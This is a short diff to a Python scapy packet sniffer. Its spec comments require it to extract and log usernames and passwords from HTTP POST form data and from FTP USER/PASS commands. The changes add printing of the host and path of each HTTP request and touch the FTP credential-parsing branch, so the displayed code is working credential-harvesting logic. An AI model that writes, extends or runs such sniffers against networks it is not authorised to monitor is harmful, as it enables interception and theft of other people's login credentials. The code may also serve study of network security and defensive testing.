@@ -78,6 +78,10 @@ def process_packet(packet):
     
     # BASED ON SPECS: The tool must extract and log sensitive information such as usernames and passwords found in HTTP POST request parameters (e.g., login forms).
     if packet.haslayer(http.HTTPRequest):
+        host = packet[http.HTTPRequest].Host.decode(errors="ignore")
+        path = packet[http.HTTPRequest].Path.decode(errors="ignore")
+        print(f"[+] HTTP Request >> {host}{path}")
+        
         if packet.haslayer(scapy.Raw):
             load = packet[scapy.Raw].load.decode(errors='ignore')
             user_fields = re.findall(r"(username|user|email)=([^&\s]+)", load, re.I)
@@ -90,7 +94,9 @@ def process_packet(packet):
     # BASED ON SPECS: The tool must extract and log sensitive information such as usernames and passwords found in FTP commands for user authentication (e.g., USER and PASS commands).
     elif packet.haslayer(TCP) and (packet[TCP].dport == 21 or packet[TCP].sport == 21):
         if packet.haslayer(scapy.Raw):
-            load = packet[scapy.Raw].load.decode(errors='ignore')
+            load = packet[scapy.Raw].load.decode(errors="ignore")
+            
+            # Checks for FTP USER and PASS commands
             if "USER" in load or "PASS" in load:
                 parts = load.strip().split()
                 if len(parts) >= 2:
